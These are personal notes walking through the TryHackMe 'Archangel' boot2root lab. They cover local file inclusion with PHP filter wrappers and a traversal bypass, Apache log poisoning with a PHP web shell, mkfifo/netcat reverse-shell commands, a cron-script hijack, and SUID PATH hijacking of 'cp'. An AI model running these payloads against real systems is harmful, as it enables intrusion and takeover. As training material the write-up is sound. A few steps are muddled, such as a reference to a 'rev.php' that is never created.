
2025-02-15 18:31

Source: #Boot2root #tryhackme 
### Recon

Rustscan shows a ssh (22) and http (80) port open 

find the hostname using the command below 
```sh
curl -s 10.10.93.69 | grep ".thm"
```

add the newly found host to `etc/hosts`
```sh
echo "10.10.93.69 mafialive.thm" | sudo tee -a /etc/hosts
```
### Exploiting LFI 

dirsearch finds a `robots.txt`, the `robots.txt` tells us that `test.php` is disallowed for robots to crawl

On `test.php` page, we can't see much except a button which when clicked prints "Control is an illusion". But if we see closely, then when we click on the button the parameter `?view=/var/www/html/development_testing/mrrobot.php` gets added to the URL. The entire path of the page `mrrobot.php` is provided over here which appears to be a bit odd because normally relative paths can be used.

Unfortunately, it seems we can’t read the code in `test.php`, probably due to a protection in the script.

However, if we try to include other files, e.g. `/etc/passwd`, we will get an error saying: ‘Sorry, That's not allowed’. To understand the code logic that filters out certain inputs, we can use PHP wrappers to include the source code of the page as base64 encoded text, then decode it. Info on PHP wrappers that can be used for LFI/RFI [https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers), [PayloadsAllTheThings/File Inclusion at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

syntax
```sh
http://***DOMAIN***.thm/***PAGE***?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/***PAGE***
```

[[curl]]
```sh
curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

above URL returns a base64 encoded string, decoding the string reveals code of `test.php`

The code is checking that the 2 below conditions are met about the injected content:

- it should not contain `../..`
- it should contain `/var/www/html/development_testing`

We can bypass the path traversal protection by replacing `../..` with `.././..`, as follows:

```sh
kali@kali:/data/Archangel$ curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log
```

From the access logs it can be seen that along with the path that we are trying to access our User-Agent is also getting logged. We can add a PHP code in the User-Agent header using Burp Suite and with the help of that gain a reverse shell.

We’ll now poison the apache2 log file by injecting a PHP payload in the user-agent string as follows
Now, let’s download a PHP reverse shell. Start by hosting it locally (`python3 -m http.server`) and download it by sending the following request in BurpSuite Repeater

1. Add the following code somewhere in the `User-Agent` header value:
    
    ```html
    <?php system($_GET['cmd']); ?>
    ```
    
2. Append `&cmd=whoami` to the GET request. Here, all that we are doing is passing `whoami` string to the `cmd` variable would get processed by the PHP code in the User-Agent and we would get the output of the command in the logged User-Agent value in the `access.log` file.

When you send the request for the first time, you won't see anything in the output because the command has just been executed and what you are viewing is the copy of log file before the output of your command was written to it. Therefore, you need to send the same request again so that the output written previous can now be viewed.

start of the malicious burp request looks 
```
GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f HTTP/1.1
Host: mafialive.thm
User-Agent: <?php system($_GET['cmd']); ?>
```
remember to url encode the revshell payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f`

call the reverse shell on the server by browsing `http://mafialive.thm/rev.php` We now have a reverse shell:
```sh
rlwrap nc -nlvp 4444
```

### Horizontal Privilege Escalation

searching the machine doesn't reveal anything good, so search for cronjobs using `cat /etc/crontab`

Here, we can see that a shell script named as `helloworld.sh` in the `/opt` directory is being executed as user archangel. We can check the permissions of that file and try to use it to gain access to the system as user archangel.

```shell
www-data@ubuntu:/home/archangel/myfiles$ cat helloworld.sh
cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```

From the output, we can see that all the `rwx` permissions are given to others. So, we can edit this file, add a payload in the bash script to create a reverse shell as user archangel. For this we can again use the same payload but change the port number

```shell
www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4445 >/tmp/f" > /opt/helloworld.sh
```
### Privesc

The secret directory contains an interesting `backup` script that has the `SETUID` bit set. Using `strings`, we can see that the `cp` command is called to copy files:

The command `cp` is being called but without its full path being mentioned. So, we can create a fake `cp` executable in and prepend its location to `$PATH`. So, whenever `cp` is called our malicious binary gets executed instead of the original `cp` command

```
archangel@ubuntu:~/secret$ cat > cp << EOF
> #!/bin/bash
> /bin/bash -i
> EOF
archangel@ubuntu:~/secret$ chmod +x cp
archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
```

when we will execute the script, it will use our own `cp` command, which will execute a root shell

#### Alternative

1. Create a fake `cp` file in `/tmp` directory and add the following code to it.
    
    ```shell
$ cd /tmp
$ touch cp
$ echo "/bin/bash -p" > cp
$ cat cp
$ chmod 777 cp
    ```
    
So, whenever the `cp` command is called `/bin/bash` would get executed with the permission of the effective user (in case of SUID binary, it would be `root`).
    
2. Prepend `/tmp` to `$PATH`
    
   ```shell
archangel@ubuntu:~/secret$ $PATH            
archangel@ubuntu:~/secret$ export PATH=/tmp:$PATH
   ```

execute `./backup`
### References
[TryHackMe | Cyber Security Training](https://tryhackme.com/room/archangel)

walkthrough

[Writeups/TryHackMe/Easy/archangel/archangel.md at master · 0xNirvana/Writeups · GitHub](https://github.com/0xNirvana/Writeups/blob/master/TryHackMe/Easy/archangel/archangel.md)
[TryHackMe-Archangel - aldeid](https://www.aldeid.com/wiki/TryHackMe-Archangel)
[Archangel - Write-up - TryHackMe | Rawsec](https://blog.raw.pm/en/TryHackMe-Archangel-write-up/)
[TryHackMe: Archangel Writeup. https://tryhackme.com/room/archangel | by ALIEN0X | Medium](https://medium.com/@infohellohumans/tryhackme-archangel-writeup-2807313edfb7)
[TryHackMe – Archangel walkthrough - narancs's blog](https://narancsblog.com/thm/easy/archangel/)